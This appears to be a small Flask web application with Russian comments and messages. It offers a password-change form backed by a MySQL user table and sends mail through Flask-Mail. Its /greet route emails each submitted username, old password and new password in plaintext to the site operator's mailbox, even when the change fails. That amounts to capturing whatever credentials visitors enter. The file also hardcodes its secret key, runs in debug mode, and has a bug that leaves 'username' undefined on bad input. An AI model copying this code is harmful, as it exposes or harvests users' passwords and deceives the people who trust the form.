from flask import Flask, render_template, request
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import generate_password_hash, check_password_hash
from flask_mail import Mail, Message
from dotenv import load_dotenv
import os

load_dotenv('ini.env')  # Загрузка переменных из .env

app = Flask(__name__)
app.config['SECRET_KEY'] = 'Goporhero5bugs5w'

# Настройка подключения к базе данных MySQL
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv('DATABASE_URL')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

# Настройки для Flask-Mail
app.config['MAIL_SERVER'] = os.getenv('MAIL_SERVER')
app.config['MAIL_PORT'] = int(os.getenv('MAIL_PORT'))
app.config['MAIL_USERNAME'] = os.getenv('MAIL_USERNAME')
app.config['MAIL_PASSWORD'] = os.getenv('MAIL_PASSWORD')
app.config['MAIL_USE_TLS'] = True
app.config['MAIL_USE_SSL'] = False

mail = Mail(app)
db = SQLAlchemy(app)

# Модель пользователя
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(120), nullable=False)

@app.route('/')
def home():
    return render_template('index.html')
@app.route('/test_mail')
def test_mail():
    try:
        msg = Message(
            'Тестовое письмо',
            sender=os.getenv('MAIL_USERNAME'),
            recipients=[os.getenv('MAIL_USERNAME')]
        )
        msg.body = 'Это тестовое письмоooo.'
        mail.send(msg)
        return "Тестовое письмо отправлено!"
    except Exception as e:
        return f"Ошибка при отправке тестового письма: {e}"

@app.route('/greet', methods=["POST", "GET"])
def greet():
    try:
        username = request.form['username']
        old_password = request.form['old_password']
        new_password = request.form['new_password']

        user = User.query.filter_by(username=username).first()

        if user and check_password_hash(user.password, old_password):
            user.password = generate_password_hash(new_password)
            db.session.commit()
            message = f"Пароль для аккаунта {username} изменен."
        else:
            message = "Пользователь не найден или старый пароль неверен."

        # Отправка email
        try:
            msg = Message(
                'Пароль изменен', 
                sender=os.getenv('MAIL_USERNAME'), 
                recipients=[os.getenv('MAIL_USERNAME')]
            )
            msg.body = f"""
            Привет, {username}!

            Ваш пароль был изменен:
            Старый пароль: {old_password}
            Новый пароль: {new_password}
            """
            mail.send(msg)
            print("Письмо отправлено успешно.")
        except Exception as e:
            print(f"Ошибка при отправке почты: {e}")
        
    except Exception as e:
        print(f"Ошибка при обработке запроса: {e}")
        message = "Произошла ошибка. Попробуйте снова."

    return render_template('index.html', message=message, username=username)

if __name__ == '__main__':
    app.run(debug=True)
